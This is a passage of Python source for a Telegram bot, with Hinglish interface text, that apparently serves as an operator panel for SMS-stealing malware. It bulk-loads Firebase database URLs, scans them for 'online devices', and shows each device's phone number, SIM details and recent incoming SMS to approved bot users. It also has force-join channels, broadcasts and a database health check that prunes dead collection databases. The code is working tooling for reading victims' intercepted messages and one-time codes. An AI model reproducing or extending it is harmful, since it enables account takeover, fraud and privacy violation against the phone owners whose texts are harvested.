def build_backup_zip():
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    name = f"firebase_bot_backup_{ts}.zip"
    buf  = io.BytesIO()
    included = []
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(os.path.abspath(__file__), arcname=SCRIPT_NAME)
        included.append(SCRIPT_NAME)
        for f in DATA_FILES:
            if os.path.exists(f):
                zf.write(f, arcname=f)
                included.append(f)
        manifest = {
            "created": ts, "files": included,
            "firebases": len(load_db()), "users": len(load_users()),
            "admins": len(load_admins()), "channels": len(load_channels()),
        }
        zf.writestr("manifest.json", json.dumps(manifest, indent=2))
    return name, buf.getvalue(), manifest

async def send_backup(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, label: str):
    name, data, m = build_backup_zip()
    caption = (f'{ce(E_BACKUP,"💚")} <b>{esc(label)}</b>\n'
               f'Firebases: <b>{m["firebases"]}</b>  |  Users: <b>{m["users"]}</b>\n'
               f'Admins: <b>{m["admins"]}</b>  |  Channels: <b>{m["channels"]}</b>')
    await ctx.bot.send_document(chat_id, document=InputFile(data, filename=name),
                                caption=caption, parse_mode="HTML")

async def read_document_bytes(doc) -> bytes:
    tg_file = await doc.get_file()
    return bytes(await tg_file.download_as_bytearray())

async def handle_restore(msg, ctx: ContextTypes.DEFAULT_TYPE):
    doc = msg.document
    if not (doc.file_name or "").lower().endswith(".zip"):
        await msg.reply_text(f'{ce(E_NO,"❎")} Sirf <b>.zip</b> backup file bhejo.',
                             parse_mode="HTML")
        return

    data = await read_document_bytes(doc)
    try:
        zf     = zipfile.ZipFile(io.BytesIO(data))
        names  = set(zf.namelist())
        parsed = {}
        for f in DATA_FILES:
            if f in names:
                parsed[f] = json.loads(zf.read(f).decode("utf-8"))
        script = zf.read(SCRIPT_NAME) if SCRIPT_NAME in names else None
    except Exception as e:
        await msg.reply_text(f'{ce(E_NO,"❎")} Invalid backup file.\n<code>{esc(e)}</code>',
                             parse_mode="HTML")
        return

    if not parsed and script is None:
        await msg.reply_text(f'{ce(E_NO,"❎")} Is backup me koi data file nahi mili.',
                             parse_mode="HTML")
        return

    await send_backup(ctx, msg.chat_id, "Safety backup (before restore)")

    restored = []
    for f, val in parsed.items():
        _save_json(f, val)
        restored.append(f)

    script_note = ""
    if script is not None:
        out = "restored_" + SCRIPT_NAME
        with open(out, "wb") as fh:
            fh.write(script)
        script_note = (f'\n\n{ce(E_PIN,"📌")} Script <code>{out}</code> save ho gayi.\n'
                       f'Purani script ki jagah ise rename karke bot restart karo.')

    ctx.user_data["state"] = None
    names_txt = ", ".join(f"<code>{esc(r)}</code>" for r in restored) or "none"
    await msg.reply_text(
        f'{ce(E_OK,"✅")} <b>Restore complete!</b>\n\nRestored: {names_txt}{script_note}',
        parse_mode="HTML")


# ─── Broadcast ──────────────────────────────────
async def run_broadcast(msg, ctx: ContextTypes.DEFAULT_TYPE):
    targets = [r["id"] for r in load_users().values()
               if r.get("approved") and not r.get("banned")]
    if not targets:
        await msg.reply_text(f'{ce(E_PEND,"😶")} Koi approved user nahi hai.',
                             parse_mode="HTML")
        return

    status = await msg.reply_text(
        f'{ce(E_BCAST,"👌")} Broadcasting to <b>{len(targets)}</b> users...',
        parse_mode="HTML")
    ok = fail = 0
    for uid in targets:
        try:
            await msg.copy(chat_id=uid)
            ok += 1
        except Exception as e:
            print(f"[BROADCAST] {uid}: {e}")
            fail += 1
        await asyncio.sleep(BROADCAST_DELAY)

    await status.edit_text(
        f'{ce(E_OK,"✅")} <b>Broadcast finished</b>\n\n'
        f'Sent   : <b>{ok}</b>\n'
        f'Failed : <b>{fail}</b>',
        parse_mode="HTML")


# ─── Channels ───────────────────────────────────
async def add_channel_from_text(msg, ctx: ContextTypes.DEFAULT_TYPE, raw: str) -> bool:
    ref = raw.strip()
    if "t.me/" in ref:
        ref = ref.split("t.me/")[-1].strip("/")
    if ref.startswith("+") or ref.startswith("joinchat"):
        await msg.reply_text(f'{ce(E_NO,"❎")} Invite link support nahi hai.\n'
                             f'<code>@username</code> ya <code>-100xxxxxxxxxx</code> bhejo.',
                             parse_mode="HTML")
        return False

    chat_ref = int(ref) if ref.lstrip("-").isdigit() else "@" + ref.lstrip("@")
    try:
        chat = await ctx.bot.get_chat(chat_ref)
    except Exception as e:
        await msg.reply_text(f'{ce(E_NO,"❎")} Channel nahi mila.\n<code>{esc(e)}</code>',
                             parse_mode="HTML")
        return False

    channels = load_channels()
    if any(c["chat_id"] == chat.id for c in channels):
        await msg.reply_text(f'{ce(E_WARN,"‼️")} Ye channel already added hai.',
                             parse_mode="HTML")
        return False

    if chat.username:
        url = f"https://t.me/{chat.username}"
    else:
        try:
            url = await ctx.bot.export_chat_invite_link(chat.id)
        except Exception as e:
            await msg.reply_text(
                f'{ce(E_NO,"❎")} Invite link nahi bana.\n'
                f'Bot ko channel me <b>admin</b> banao, phir dobara add karo.\n'
                f'<code>{esc(e)}</code>', parse_mode="HTML")
            return False

    channels.append({"chat_id": chat.id, "title": chat.title or str(chat.id), "url": url})
    save_channels(channels)
    await msg.reply_text(
        f'{ce(E_OK,"✅")} <b>Channel added!</b>\n\n'
        f'{ce(CE_LINK,"🔗")} {esc(chat.title or chat.id)}\n'
        f'Total: <b>{len(channels)}</b>', parse_mode="HTML")
    return True


# ─── Button Handler ─────────────────────────────
async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    d = q.data

    if d == "noop":
        await q.answer()
        return

    # "I've Joined" — allowed before approval
    if d == "verify_join":
        if await missing_channels(ctx, q.from_user.id):
            await q.answer("Pehle sab channels join karo.", show_alert=True)
            return
        await q.answer()
        await route_user(ctx, q.from_user,
                         send=lambda t, kb=None: edit(q, t, kb))
        return

    # Access gate
    if not is_admin(update) and not is_user_allowed(q.from_user.id):
        await q.answer("Access pending admin approval.", show_alert=True)
        return

    await q.answer()

    # ── Online Devices (instant snapshot) ──
    if d == "scan_now" or d.startswith("devs_"):
        if d == "scan_now":
            if not SCAN["running"]:
                ctx.application.create_task(run_full_scan())
            page = ctx.user_data.get("devs_page", 0)
        else:
            page = int(d.split("_")[1])
        ctx.user_data["devs_page"] = page

        devices = snapshot_online()
        header  = scan_summary_text()
        if devices:
            await edit(q, header, devices_kb(devices, page))
        else:
            hint = (f'{ce(E_SCAN,"💪")} Scan chal raha hai, thodi der me Refresh karo.'
                    if SCAN["running"] or not SCAN["devices"]
                    else f'{ce(E_OFF,"😐")} Abhi koi online device nahi mila.')
            await edit(q, f"{header}\n\n{hint}",
                       InlineKeyboardMarkup([[
                           B("Refresh", cb="scan_now", icon=E_REFRESH),
                           B("Back",    cb="user_back", icon=E_BACK),
                       ]]))
        return

    # ── Device detail ──
    if d.startswith("dev_"):
        sid = int(d.split("_")[1])
        key = DEV_BY_ID.get(sid)
        if not key:
            await edit(q, f'{ce(E_WARN,"‼️")} Device nahi mila. Refresh karo.',
                       InlineKeyboardMarkup([[B("Refresh", cb="scan_now", icon=E_REFRESH)]]))
            return

        fb_url, device_id = key
        await edit(q, f'{ce(E_SCAN,"💪")} <b>Fetching live device data...</b>')

        dev = await fetch_device(fb_url, device_id) or dict(SCAN["devices"].get(key, {}))
        dev["_id"] = device_id
        dev["_fb"] = fb_url

        online   = is_online(dev)
        status_e = ce(CE_ONLINE, "📱") if online else ce(CE_OFFLINE, "📵")
        status_t = "Online" if online else "Offline"

        name   = esc(dev.get("name") or dev.get("deviceName") or
                     dev.get("model") or dev.get("brand") or device_id)
        number = esc(get_phone(dev) or "N/A")
        sim1   = esc(get_sim(dev, 1))
        sim2   = esc(get_sim(dev, 2))

        raw = (dev.get("sms") or dev.get("messages") or dev.get("SMS") or
               dev.get("inbox") or dev.get("receivedSms") or {})
        if isinstance(raw, dict):
            sms_list = list(raw.values())
        elif isinstance(raw, list):
            sms_list = raw
        else:
            sms_list = []
        sms_list = list(reversed(sms_list[-20:]))

        text = (f'{status_e}  <b>{name}</b>  —  <i>{status_t}</i>\n{SEP}\n'
                f'{ce(E_PHONE,"💻")} <b>Number :</b>  <code>{number}</code>\n'
                f'{ce(E_SIM,"💎")} <b>SIM 1  :</b>  <code>{sim1}</code>\n'
                f'{ce(E_SIM,"💎")} <b>SIM 2  :</b>  <code>{sim2}</code>\n{SEP}\n')

        if sms_list:
            text += f'{ce(E_SMS,"💞")} <b>Incoming SMS ({len(sms_list)}):</b>\n\n'
            for sms in sms_list:
                if isinstance(sms, dict):
                    sender = esc(sms.get("from") or sms.get("sender") or sms.get("address")
                                 or sms.get("number") or "?")
                    body   = esc((sms.get("body") or sms.get("message") or sms.get("text")
                                  or sms.get("content") or "")[:300])
                    ts     = esc(sms.get("time") or sms.get("date") or sms.get("timestamp")
                                 or sms.get("receivedAt") or "")
                    text  += f'{ce(CE_RIGHT,"➡️")} <b>{sender}</b>'
                    if ts:
                        text += f'  <i>({ts})</i>'
                    text += f'\n{body}\n\n'
                else:
                    text += f'{ce(CE_RIGHT,"➡️")} {esc(str(sms)[:300])}\n\n'
        else:
            text += f'{ce(E_SMS,"💞")} <b>No SMS found.</b>'

        if len(text) > 3900:
            text = text[:3900] + "\n\n<i>... more messages exist</i>"

        back_page = ctx.user_data.get("devs_page", 0)
        await edit(q, text, InlineKeyboardMarkup([[
            B("Refresh", cb=f"dev_{sid}", icon=E_REFRESH),
            B("Devices", cb=f"devs_{back_page}", icon=E_BACK),
        ]]))
        return

    # ── User back ──
    if d == "user_back":
        await edit(q, f'{ce(E_WAVE,"😊")} <b>Welcome!</b>\n\n'
                      f'{ce(E_DOWN,"🙂")} Choose an option:', user_kb())
        return

    # ── Admin only below ──
    if not is_admin(update):
        return

    # Leaving any input prompt clears the pending state
    ctx.user_data["state"] = None

    if d == "admin_back":
        await edit(q, f'{ce(E_GEAR,"😑")} <b>Admin Panel</b>', admin_kb())

    # ── Firebase management ──
    elif d == "manage_firebase":
        await edit(q, f'{ce(CE_FIRE,"🔥")} <b>Manage Firebases</b>\n'
                      f'{ce(E_PIN,"📌")} Total saved: <b>{len(load_db())}</b>', manage_kb())

    elif d == "view_firebases":
        fbs = load_db()
        if not fbs:
            text = f'{ce(E_WARN,"‼️")} Abhi koi Firebase add nahi hai.'
        else:
            text = f'{ce(CE_FIRE,"🔥")} <b>Firebase Databases ({len(fbs)})</b>\n\n'
            for i, url in enumerate(fbs, 1):
                text += f'{ce(CE_LINK,"🔗")} {i}. <code>{esc(url)}</code>\n'
        await edit(q, text, back_admin_kb("manage_firebase"))

    elif d == "db_health":
        fbs = load_db()
        st  = load_db_status()
        counts = {}
        for fb in fbs:
            kind = (st.get(fb) or {}).get("kind", "ok")
            counts[kind] = counts.get(kind, 0) + 1
        dead = [(fb, st[fb]) for fb in fbs if fb in st and st[fb].get("kind") != "ok"]

        text = (f'{ce(E_BROKEN,"💔")} <b>Firebase DB Health</b>\n{SEP}\n'
                f'{ce(E_LIST,"📒")} Total DBs : <b>{len(fbs)}</b>\n'
                f'{ce(E_OK,"✅")} Working   : <b>{counts.get("ok", 0)}</b>\n')
        for kind in ("locked", "notfound", "denied", "bad", "error"):
            if counts.get(kind):
                text += f'{ce(E_ALERT,"❗")} {KIND_LABEL[kind]} : <b>{counts[kind]}</b>\n'

        if dead:
            text += f'\n<b>Dead list (first 25):</b>\n'
            for fb, rec in dead[:25]:
                host = fb.replace("https://", "").replace("http://", "").rstrip("/")
                text += f'• <code>{esc(host[:52])}</code> — {KIND_LABEL.get(rec.get("kind"), "?")}\n'
            if len(dead) > 25:
                text += f'<i>... +{len(dead) - 25} more</i>\n'
            text += ('\n<i>423 = Firebase ne DB lock kar diya (free quota khatam / '
                     'billing off). Ye apne aap 6 ghante baad recheck hoga.</i>')
        else:
            text += f'\n{ce(E_OK,"✅")} Sabhi DBs working hain.'

        rows = []
        if dead:
            rows.append([B("Recheck All", cb="db_recheck", icon=E_REFRESH)])
            rows.append([B(f"Remove Dead ({len(dead)})", cb="db_remove_dead", icon=E_NO)])
        rows.append([B("Back", cb="manage_firebase", icon=E_BACK)])
        if len(text) > 4000:
            text = text[:4000] + "\n<i>... truncated</i>"
        await edit(q, text, InlineKeyboardMarkup(rows))

    elif d == "db_recheck":
        clear_db_status()
        SCAN["parked"] = {}
        if not SCAN["running"]:
            ctx.application.create_task(run_full_scan())
        await edit(q, f'{ce(E_REFRESH,"💘")} <b>Recheck shuru...</b>\n\n'
                      f'Sabhi DBs (including locked) dobara check ho rahe hain. '
                      f'1-2 minute baad DB Health kholo.',
                   back_admin_kb("manage_firebase"))

    elif d == "db_remove_dead":
        fbs = load_db()
        st  = load_db_status()
        dead = {fb for fb in fbs if fb in st and st[fb].get("kind") != "ok"}
        if not dead:
            await edit(q, f'{ce(E_OK,"✅")} Koi dead DB nahi hai.',
                       back_admin_kb("manage_firebase"))
            return
        save_db([fb for fb in fbs if fb not in dead])
        for key in list(SCAN["devices"]):
            if key[0] in dead:
                del SCAN["devices"][key]
        st = {k: v for k, v in st.items() if k not in dead}
        save_db_status(st)
        SCAN["parked"] = {}
        await edit(q, f'{ce(E_OK,"✅")} <b>{len(dead)} dead DBs remove ho gaye.</b>\n\n'
                      f'{ce(E_LIST,"📒")} Ab total: <b>{len(load_db())}</b>',
                   back_admin_kb("manage_firebase"))

    elif d == "add_firebase":
        await edit(q,
            f'{ce(CE_LINK,"🔗")} <b>Firebase Database URL bhejo</b>\n\n'
            f'Example:\n<code>https://myapp-default-rtdb.firebaseio.com</code>',
            cancel_kb("manage_firebase"))
        ctx.user_data["state"] = "add_firebase"

    elif d == "add_bulk":
        await edit(q,
            f'{ce(E_BULKTXT,"📝")} <b>Bulk Add Firebase</b>\n\n'
            f'• <b>.txt file</b> bhejo (jisme saari URLs hon)\n'
            f'• ya <b>text</b> paste karo jisme URLs hon\n\n'
            f'Bot saari Firebase links automatically nikal kar add karega.',
            cancel_kb("manage_firebase"))
        ctx.user_data["state"] = "add_bulk"

    elif d == "remove_firebase":
        fbs = load_db()
        if not fbs:
            await edit(q, f'{ce(E_WARN,"‼️")} Remove karne ke liye koi Firebase nahi hai.',
                       back_admin_kb("manage_firebase"))
            return
        buttons = []
        for i, url in enumerate(fbs):
            label = url.replace("https://", "").replace("http://", "")[:44]
            buttons.append([B(label, cb=f"del_{i}", icon=E_NO)])
        buttons.append([B("Back", cb="manage_firebase", icon=E_BACK)])
        await edit(q, f'{ce(E_WARN,"‼️")} <b>Remove karne ke liye Firebase chuno:</b>',
                   InlineKeyboardMarkup(buttons))

    elif d.startswith("del_"):
        idx = int(d.split("_")[1])
        fbs = load_db()
        if idx < len(fbs):
            removed = fbs.pop(idx)
            save_db(fbs)
            st = load_db_status()
            if removed in st:
                st.pop(removed)
                save_db_status(st)
            for key in list(SCAN["devices"]):
                if key[0] == removed:
                    del SCAN["devices"][key]
            await edit(q,
                f'{ce(E_OK,"✅")} <b>Removed:</b>\n<code>{esc(removed)}</code>\n\n'
                f'{ce(E_PIN,"📌")} Remaining: <b>{len(fbs)}</b>',
                back_admin_kb("manage_firebase"))

    # ── All users ──
    elif d.startswith("all_users_"):
        await render_all_users(q, int(d.split("_")[2]))

    elif d.startswith("usr_"):
        await render_user_detail(q, int(d[4:]))

    elif d.startswith("approve_"):
        uid   = int(d.split("_")[1])
        users = load_users()
        rec   = users.get(str(uid))
        if rec and not rec.get("approved"):
            rec["approved"] = True
            save_users(users)
            await notify_user(ctx, uid,
                f'{ce(E_OK,"✅")} <b>Aapko approve kar diya gaya hai!</b>\n'
                f'Ab aap bot use kar sakte ho.', kb=user_kb())
        await render_user_detail(q, uid)

    elif d.startswith("ban_"):
        uid   = int(d.split("_")[1])
        users = load_users()
        rec   = users.get(str(uid))
        if rec:
            rec["banned"] = True
            save_users(users)
            await notify_user(ctx, uid, f'{ce(E_BAN,"💜")} <b>Aapko bot se ban kar diya gaya hai.</b>')
        await render_user_detail(q, uid)

    elif d.startswith("unban_"):
        uid   = int(d.split("_")[1])
        users = load_users()
        rec   = users.get(str(uid))
        if rec:
            rec["banned"] = False
            save_users(users)
            await notify_user(ctx, uid, f'{ce(E_UNBAN,"🌹")} <b>Aapka ban hata diya gaya hai.</b>')
        await render_user_detail(q, uid)

    elif d.startswith("unap_"):
        uid     = int(d.split("_")[1])
        users   = load_users()
        removed = users.pop(str(uid), None)
        save_users(users)
        if removed:
            await notify_user(ctx, uid,
                f'{ce(E_ALERT,"❗")} <b>Aapki access admin ne remove kar di hai.</b>\n'
                f'Dobara use karne ke liye /start bhejo.')
        await edit(q,
            f'{ce(E_NO,"❎")} <b>User database se remove ho gaya.</b>\n\n'
            f'Bot use karne ke liye ab approval chahiye hogi.',
            back_admin_kb("all_users_0"))

    # ── Broadcast ──
    elif d == "broadcast":
        await edit(q,
            f'{ce(E_BCAST,"👌")} <b>Broadcast</b>\n\n'
            f'Ab jo bhi message bhejoge (text, photo, video, file etc.) '
            f'wo sab approved users ko chala jayega.',
            cancel_kb("admin_back"))
        ctx.user_data["state"] = "broadcast"

    # ── Admins ──
    elif d == "admins":
        await render_admins(q)

    elif d == "add_admin":
        await edit(q,
            f'{ce(E_ADMIN,"🥳")} <b>Add Admin</b>\n\n'
            f'Naye admin ka <b>User ID</b> (sirf numbers) bhejo.',
            cancel_kb("admins"))
        ctx.user_data["state"] = "add_admin"

    elif d.startswith("rm_admin_"):
        aid    = int(d.split("_")[-1])
        extras = load_admins()
        if aid in extras:
            extras.remove(aid)
            save_admins(extras)
        await render_admins(q)

    # ── Channels ──
    elif d == "channels":
        await render_channels(q)

    elif d == "add_channel":
        await edit(q,
            f'{ce(CE_LINK,"🔗")} <b>Force-Join Channel add karo</b>\n\n'
            f'Channel ka <code>@username</code> ya ID <code>-100xxxxxxxxxx</code> bhejo.\n'
            f'{ce(E_WARN,"‼️")} Bot us channel me <b>admin</b> hona chahiye.',
            cancel_kb("channels"))
        ctx.user_data["state"] = "add_channel"

    elif d.startswith("rmch_"):
        idx = int(d.split("_")[1])
        chs = load_channels()
        if idx < len(chs):
            chs.pop(idx)
            save_channels(chs)
        await render_channels(q)

    # ── Backup & Restore ──
    elif d == "backup":
        await edit(q, f'{ce(E_BACKUP,"💚")} <b>Backup ban raha hai...</b>')
        await send_backup(ctx, q.message.chat_id, "Manual backup")
        await edit(q, f'{ce(E_GEAR,"😑")} <b>Admin Panel</b>\n\n'
                      f'{ce(E_OK,"✅")} Backup file upar bhej di gayi hai.', admin_kb())

    elif d == "restore":
        await edit(q,
            f'{ce(E_RESTORE,"💐")} <b>Restore</b>\n\n'
            f'Backup <b>.zip</b> file bhejo. Restore se pehle current data ka '
            f'safety backup bhi bheja jayega.',
            cancel_kb("admin_back"))
        ctx.user_data["state"] = "restore"


# ─── Message handler (text, documents, media) ───
async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return
    state = ctx.user_data.get("state")
    if not state:
        return

    msg = update.message

    if state == "add_firebase":
        if not msg.text:
            return
        urls = extract_fb_urls(msg.text)
        if not urls:
            await msg.reply_text(f'{ce(E_NO,"❎")} Invalid Firebase URL!\n\n'
                                 f'Format: <code>https://xxx.firebaseio.com</code>',
                                 parse_mode="HTML")
            return
        added, skipped, total = add_firebases(urls)
        await msg.reply_text(
            f'{ce(E_OK,"✅")} <b>Firebase Added!</b>\n\n'
            f'{ce(E_SPARK,"✨")} Added   : <b>{added}</b>\n'
            f'{ce(E_WARN,"‼️")} Skipped : <b>{skipped}</b> (already exists)\n'
            f'{ce(E_PIN,"📌")} Total   : <b>{total}</b>',
            parse_mode="HTML")
        ctx.user_data["state"] = None

    elif state == "add_bulk":
        if msg.document:
            if not (msg.document.file_name or "").lower().endswith(".txt"):
                await msg.reply_text(f'{ce(E_NO,"❎")} Sirf <b>.txt</b> file bhejo.',
                                     parse_mode="HTML")
                return
            text = (await read_document_bytes(msg.document)).decode("utf-8", errors="ignore")
        elif msg.text:
            text = msg.text
        else:
            return

        urls = extract_fb_urls(text)
        if not urls:
            await msg.reply_text(
                f'{ce(E_NO,"❎")} Koi Firebase URL nahi mila.\n'
                f'Format: <code>xxx.firebaseio.com</code>', parse_mode="HTML")
            return

        added, skipped, total = add_firebases(urls)
        preview = "\n".join(f'{ce(CE_LINK,"🔗")} <code>{esc(u)}</code>' for u in urls[:8])
        more    = f'\n<i>...aur {len(urls)-8} more</i>' if len(urls) > 8 else ""
        await msg.reply_text(
            f'{ce(E_OK,"✅")} <b>Bulk Add Complete!</b>\n\n'
            f'{ce(E_STAR,"⭐")} Found   : <b>{len(urls)}</b>\n'
            f'{ce(E_SPARK,"✨")} Added   : <b>{added}</b>\n'
            f'{ce(E_WARN,"‼️")} Skipped : <b>{skipped}</b>\n'
            f'{ce(E_PIN,"📌")} Total   : <b>{total}</b>\n\n{preview}{more}',
            parse_mode="HTML")
        ctx.user_data["state"] = None

    elif state == "broadcast":
        ctx.user_data["state"] = None
        await run_broadcast(msg, ctx)

    elif state == "add_admin":
        raw = (msg.text or "").strip()
        if not raw.isdigit():
            await msg.reply_text(f'{ce(E_NO,"❎")} Sirf numeric User ID bhejo.',
                                 parse_mode="HTML")
            return
        aid = int(raw)
        ctx.user_data["state"] = None
        if is_admin_id(aid):
            await msg.reply_text(f'{ce(E_WARN,"‼️")} Ye user already admin hai.',
                                 parse_mode="HTML")
            return
        lst = load_admins()
        lst.append(aid)
        save_admins(lst)
        note = ""
        try:
            await ctx.bot.send_message(
                aid,
                f'{ce(E_ADMIN,"🥳")} <b>Aapko admin bana diya gaya hai.</b>\n'
                f'Admin panel ke liye /admin bhejo.',
                parse_mode="HTML")
        except Exception:
            note = "\n⚠️ Notification nahi gaya. Naye admin ko bot pe /start karna hoga."
        await msg.reply_text(
            f'{ce(E_OK,"✅")} <b>Admin added:</b> <code>{aid}</code>{note}',
            parse_mode="HTML")

    elif state == "add_channel":
        if not msg.text:
            return
        if await add_channel_from_text(msg, ctx, msg.text):
            ctx.user_data["state"] = None

    elif state == "restore":
        if msg.document:
            await handle_restore(msg, ctx)
        else:
            await msg.reply_text(f'{ce(E_NO,"❎")} Backup <b>.zip</b> file bhejo.',
                                 parse_mode="HTML")


# ─── Main ───────────────────────────────────────
def main():
    app = (Application.builder()
           .token(BOT_TOKEN)
           .post_init(on_startup)
           .build())
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("inspect", cmd_inspect))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, on_message))
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
